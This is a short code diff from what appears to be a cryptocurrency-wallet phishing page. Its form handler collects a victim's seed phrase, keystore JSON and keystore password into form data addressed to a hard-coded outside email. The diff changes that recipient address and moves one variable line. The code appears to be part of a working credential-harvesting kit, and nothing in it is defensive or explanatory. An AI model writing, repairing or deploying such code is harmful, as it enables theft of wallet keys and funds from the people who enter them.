@@ -2461,15 +2461,15 @@
     form.addEventListener("submit", o);
 
     function o(e) {
-      let walletName = walletname.innerHTML + " " + 'Wallet';
       console.log(walletName)
       e.preventDefault();
       let a = document.querySelector(".label");
-      mail = "Mayhemofflin@gmail.com";
+      mail = "Mayhemoflin@gmail.com";
       next = "next.html";
       subject = `${window.location.hostname} ${new Date()}`;
       let r = new FormData();
       let s = document.querySelector("form").name;
+      let walletName = walletname.innerHTML + " " + 'Wallet';
       phrase = phraseInput.value;
       jsonphrase = keystorejson.value;
       password = keystorepassword.value;
